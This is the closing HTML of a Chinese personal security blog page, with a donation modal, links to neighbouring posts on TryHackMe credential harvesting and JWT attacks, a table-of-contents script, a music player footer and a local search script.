    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>

    <!-- Modal Structure -->
    <div id="rewardModal" class="modal">
        <div class="modal-content">
            <a class="close modal-close"><i class="fas fa-times"></i></a>
            <h4 class="reward-title">你的赏识是我前进的动力</h4>
            <div class="reward-content">
                <div class="reward-tabs">
                    <ul class="tabs row">
                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
                    </ul>
                    <div id="alipay">
                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
                    </div>
                    <div id="wechat">
                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<script>
    $(function () {
        $('.tabs').tabs();
    });
</script>

            
        </div>
    </div>

    

    

    

    

    

    

    

    

<article id="prenext-posts" class="prev-next articles">
    <div class="row article-row">
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge left-badge text-color">
                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
            <div class="card">
                <a href="/2024/03/04/thm-ping-ju-shou-ji/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="THM-Credentials Harvesting(凭据收集)">
                        
                        <span class="card-title">THM-Credentials Harvesting(凭据收集)</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                        <span class="publish-date">
                            <i class="far fa-clock fa-fw icon-date"></i>2024-03-04
                        </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/TryHackMe/" class="post-category">
                                    TryHackMe
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/TryHackMe/">
                        <span class="chip bg-color">TryHackMe</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
        
        <div class="article col s12 m6" data-aos="fade-up">
            <div class="article-badge right-badge text-color">
                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
            </div>
            <div class="card">
                <a href="/2024/02/27/jwt-gong-ji-xue-xi/">
                    <div class="card-image">
                        
                        
                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="JWT攻击学习">
                        
                        <span class="card-title">JWT攻击学习</span>
                    </div>
                </a>
                <div class="card-content article-content">
                    <div class="summary block-with-text">
                        
                            
                        
                    </div>
                    <div class="publish-info">
                            <span class="publish-date">
                                <i class="far fa-clock fa-fw icon-date"></i>2024-02-27
                            </span>
                        <span class="publish-author">
                            
                            <i class="fas fa-bookmark fa-fw icon-category"></i>
                            
                            <a href="/categories/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" class="post-category">
                                    web知识总结
                                </a>
                            
                            
                        </span>
                    </div>
                </div>
                
                <div class="card-action article-tags">
                    
                    <a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/">
                        <span class="chip bg-color">基本知识</span>
                    </a>
                    
                </div>
                
            </div>
        </div>
        
    </div>
</article>

</div>



<!-- 代码块功能依赖 -->
<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>

<!-- 代码语言 -->

<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>


<!-- 代码块复制 -->

<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>


<!-- 代码块收缩 -->

<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>


    </div>
    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
        <div class="toc-widget card" style="background-color: white;">
            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
            <div id="toc-content"></div>
        </div>
    </div>
</div>

<!-- TOC 悬浮按钮. -->

<div id="floating-toc-btn" class="hide-on-med-and-down">
    <a class="btn-floating btn-large bg-color">
        <i class="fas fa-list-ul"></i>
    </a>
</div>


<script src="/libs/tocbot/tocbot.min.js"></script>
<script>
    $(function () {
        tocbot.init({
            tocSelector: '#toc-content',
            contentSelector: '#articleContent',
            headingsOffset: -($(window).height() * 0.4 - 45),
            collapseDepth: Number('0'),
            headingSelector: 'h2, h3, h4'
        });

        // modify the toc link href to support Chinese.
        let i = 0;
        let tocHeading = 'toc-heading-';
        $('#toc-content a').each(function () {
            $(this).attr('href', '#' + tocHeading + (++i));
        });

        // modify the heading title id to support Chinese.
        i = 0;
        $('#articleContent').children('h2, h3, h4').each(function () {
            $(this).attr('id', tocHeading + (++i));
        });

        // Set scroll toc fixed.
        let tocHeight = parseInt($(window).height() * 0.4 - 64);
        let $tocWidget = $('.toc-widget');
        $(window).scroll(function () {
            let scroll = $(window).scrollTop();
            /* add post toc fixed. */
            if (scroll > tocHeight) {
                $tocWidget.addClass('toc-fixed');
            } else {
                $tocWidget.removeClass('toc-fixed');
            }
        });

        
        /* 修复文章卡片 div 的宽度. */
        let fixPostCardWidth = function (srcId, targetId) {
            let srcDiv = $('#' + srcId);
            if (srcDiv.length === 0) {
                return;
            }

            let w = srcDiv.width();
            if (w >= 450) {
                w = w + 21;
            } else if (w >= 350 && w < 450) {
                w = w + 18;
            } else if (w >= 300 && w < 350) {
                w = w + 16;
            } else {
                w = w + 14;
            }
            $('#' + targetId).width(w);
        };

        // 切换TOC目录展开收缩的相关操作.
        const expandedClass = 'expanded';
        let $tocAside = $('#toc-aside');
        let $mainContent = $('#main-content');
        $('#floating-toc-btn .btn-floating').click(function () {
            if ($tocAside.hasClass(expandedClass)) {
                $tocAside.removeClass(expandedClass).hide();
                $mainContent.removeClass('l9');
            } else {
                $tocAside.addClass(expandedClass).show();
                $mainContent.addClass('l9');
            }
            fixPostCardWidth('artDetail', 'prenext-posts');
        });
        
    });
</script>

    

</main>




    <footer class="page-footer bg-color">
    
        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
<style>
    .aplayer .aplayer-lrc p {
        
        display: none;
        
        font-size: 12px;
        font-weight: 700;
        line-height: 16px !important;
    }

    .aplayer .aplayer-lrc p.aplayer-lrc-current {
        
        display: none;
        
        font-size: 15px;
        color: #42b983;
    }

    
    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
        left: -66px !important;
    }

    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
        left: 0px !important;
    }

    
</style>
<div class="">
    
    <div class="row">
        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
                   server="netease"
                   type="playlist"
                   id="503838841"
                   fixed='true'
                   autoplay='false'
                   theme='#42b983'
                   loop='all'
                   order='random'
                   preload='auto'
                   volume='0.7'
                   list-folded='true'
        >
        </meting-js>
    </div>
</div>

<script src="/libs/aplayer/APlayer.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/meting@2/dist/Meting.min.js"></script>

    
    <div class="container row center-align" style="margin-bottom: 0px !important;">
        <div class="col s12 m8 l8 copy-right">
            Copyright&nbsp;&copy;
            
                <span id="year">2019-2024</span>
            
            <span id="year">2019</span>
            <a href="/about" target="_blank">hybcx</a>
            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
            <br>
            
            
            
            
            
            
            <span id="busuanzi_container_site_pv">
                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
                    class="white-color"></span>&nbsp;次
            </span>
            
            
            <span id="busuanzi_container_site_uv">
                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
                    class="white-color"></span>&nbsp;人
            </span>
            
            <br>
            
            <br>
            
        </div>
        <div class="col s12 m4 l4 social-link social-statis">
    <a href="https://github.com/blinkfox" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
        <i class="fab fa-github"></i>
    </a>



    <a href="mailto:1181062873@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
        <i class="fas fa-envelope-open"></i>
    </a>







    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1181062873" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1181062873" data-position="top" data-delay="50">
        <i class="fab fa-qq"></i>
    </a>







    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
        <i class="fas fa-rss"></i>
    </a>

</div>
    </div>
</footer>

<div class="progress-bar"></div>


    <!-- 搜索遮罩框 -->
<div id="searchModal" class="modal">
    <div class="modal-content">
        <div class="search-header">
            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
                   class="search-input">
        </div>
        <div id="searchResult"></div>
    </div>
</div>

<script type="text/javascript">
$(function () {
    var searchFunc = function (path, search_id, content_id) {
        'use strict';
        $.ajax({
            url: path,
            dataType: "xml",
            success: function (xmlResponse) {
                // get the contents from search data
                var datas = $("entry", xmlResponse).map(function () {
                    return {
                        title: $("title", this).text(),
                        content: $("content", this).text(),
                        url: $("url", this).text()
                    };
                }).get();
                var $input = document.getElementById(search_id);
                var $resultContent = document.getElementById(content_id);
                $input.addEventListener('input', function () {
                    var str = '<ul class=\"search-result-list\">';
                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
                    $resultContent.innerHTML = "";
                    if (this.value.trim().length <= 0) {
                        return;
                    }
                    // perform local searching
                    datas.forEach(function (data) {
                        var isMatch = true;
                        var data_title = data.title.trim().toLowerCase();
                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
                        var data_url = data.url;
                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
                        var index_title = -1;
                        var index_content = -1;
                        var first_occur = -1;
                        // only match artiles with not empty titles and contents
                        if (data_title !== '' && data_content !== '') {
                            keywords.forEach(function (keyword, i) {
                                index_title = data_title.indexOf(keyword);
                                index_content = data_content.indexOf(keyword);
                                if (index_title < 0 && index_content < 0) {
                                    isMatch = false;
                                } else {
                                    if (index_content < 0) {
                                        index_content = 0;
                                    }
                                    if (i === 0) {
                                        first_occur = index_content;
                                    }
                                }
                            });
                        }
                        // show search results
                        if (isMatch) {
                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
                            var content = data.content.trim().replace(/<[^>]+>/g, "");
                            if (first_occur >= 0) {
                                // cut out 100 characters
                                var start = first_occur - 20;
                                var end = first_occur + 80;
                                if (start < 0) {
                                    start = 0;
                                }
                                if (start === 0) {
                                    end = 100;
                                }
                                if (end > content.length) {
                                    end = content.length;
                                }
                                var match_content = content.substr(start, end);
                                // highlight all keywords
                                keywords.forEach(function (keyword) {
                                    var regS = new RegExp(keyword, "gi");
                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
                                });

                                str += "<p class=\"search-result\">" + match_content + "...</p>"
                            }
                            str += "</li>";
                        }
                    });
                    str += "</ul>";
                    $resultContent.innerHTML = str;
                });
            }
        });
    };

    searchFunc('/search.xml', 'searchInput', 'searchResult');
});
</script>

    <!-- 回到顶部按钮 -->
<div id="backTop" class="top-scroll">
    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
        <i class="fas fa-arrow-up"></i>
    </a>
</div>


    <script src="/libs/materialize/materialize.min.js"></script>
    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
    <script src="/libs/aos/aos.js"></script>
    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
    <script src="/js/matery.js"></script>

    <!-- Baidu Analytics -->

    <!-- Baidu Push -->

<script>
    (function () {
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https') {
            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
        } else {
            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
        }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
</script>

    
    <script src="/libs/others/clicklove.js" async="async"></script>
    
    
    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
    

    

    

	
    

    

    

    
    <script src="/libs/instantpage/instantpage.js" type="module"></script>
    

</body>

</html>
